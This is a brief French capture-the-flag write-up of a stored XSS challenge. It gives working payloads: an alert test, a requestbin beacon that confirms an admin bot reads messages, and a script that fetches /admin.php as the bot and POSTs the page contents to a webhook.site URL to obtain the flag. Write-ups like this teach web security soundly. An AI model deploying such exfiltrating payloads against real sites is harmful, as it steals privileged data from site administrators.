Solution:

Sur le site on nous dit qu'on ne peut pas accéder à /admin.php

On a aussi un formulaire de contact et des commentaires.
On pense naturellement à une XSS
On teste donc si la XSS est avérée:

<script>alert(1);</script>

La page refresh au bout de 5 secondes, et bingo le script s'est exécuté.

On regarde maintenant si un robot lit les messages que l'on envoie:

<script>
    document.write('<img src="http://requestbin.net/r/yvnpmcyv"/>')
</script>

On reçoit une requête du robot comme prévu:

Nous allons maintenant récupérer la page admin.php grâce au robot.

<script>
    //on récupère la page
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/admin.php', false);
    xhr.send();

    var page = xhr.responseText;

    //et on envoie le contenu de la page dans un post
    xhr.open('POST', 'https://webhook.site/3c38f9b5-9979-485e-8999-ff4174c5b87f', false);
    xhr.send(page);
</script>

Et on reçoit le flag sur webhook :)

Hero{b3_c4r3ful_w1th_xss_!!}